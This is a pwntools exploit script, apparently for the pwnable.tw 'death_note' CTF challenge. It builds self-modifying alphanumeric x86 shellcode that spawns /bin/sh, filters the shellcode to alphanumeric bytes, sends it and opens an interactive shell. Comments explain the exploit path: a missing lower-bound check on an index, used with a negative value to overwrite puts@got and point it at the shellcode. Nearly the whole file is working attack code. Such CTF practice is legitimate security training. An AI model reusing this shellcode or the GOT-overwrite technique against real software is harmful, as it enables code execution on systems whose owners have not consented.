#!/usr/bin/python3
from pwn import *

exe = './chall32'
elf = context.binary = ELF(exe)
# libc = ELF("")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* main+118
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

# p.recvuntil(b" :")
# p.sendline(b"1")
# p.recvuntil(b" :")
# p.sendline(b"-16") # puts@got
# p.recvuntil(b" :")

# address = 0x0804b1a0

'''
eax = 0x0b
ebx = pointer to /bin/sh
ecx = 0
edx = 0
'''

'''
*EAX  0xfffffff0
*EBX  0xf7f9a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 ECX  0x0
*EDX  0x804b1a0 ◂— 'BBBB'
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0xffffd0f4 —▸ 0xffffd29d ◂— '/home/tourpran/Downloads/all-my-pwn-work/pwnable.tw/deathnote/death_note'
*EBP  0xffffd018 —▸ 0xffffd028 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0
*ESP  0xffffcf9c —▸ 0x80487f4 (add_note+165) ◂— add esp, 0x10
*EIP  0x804b1a0 ◂— 'BBBB'
'''

bob = asm("""
    mov edx, eax
    """)

shellcode = asm("""
    push 0x41
    pop eax
    xor al, 0x41
    dec eax
    xor [edx+71], al
    push 0x41
    pop eax 
    xor byte ptr[edx+71], al 
    xor al, 0x41
    dec eax
    xor byte ptr[edx+72], al
    push 0x36
    pop eax
    xor byte ptr[edx+72], al
    """) 

shellcode += asm("""
    xor al, 0x36
    push eax
    push 0x68735858
    pop eax
    xor ax, 0x7777
    push eax
    push 0x30
    pop eax
    xor al, 0x30
    xor eax, 0x6e696230
    dec eax
    push eax
    push esp
    pop eax
    push edx
    push ecx
    push ebx
    push eax
    push esp
    push ebp
    push esi
    push edi
    popad
    """)
shellcode += asm("""
    push 0x41
    pop eax
    xor al, 0x4a
    """)

shellcode += asm("""
    .byte 0x73
    .byte 0x49
    """)

print(len(shellcode))
for i in range(len(shellcode)):
    # print(shellcode[i])
    if(shellcode[i] == 73):
        print(i)
#check()
for i in shellcode:
    if(not chr(i).isalnum()):
        print(shellcode)
        print("Bad shellcode", chr(i), shellcode.index(i))
        exit()

p.sendline(bob + shellcode)

p.interactive()

'''
add:
    - checks for the upper bound but not the lower bound hmm.
    - negative values are given to access more memory region. wraps around and sets the highest bit for -1.
    - make the puts@got point to our shellcode then boom. 

Idea:
    - Self modyfing shellcode ?

'''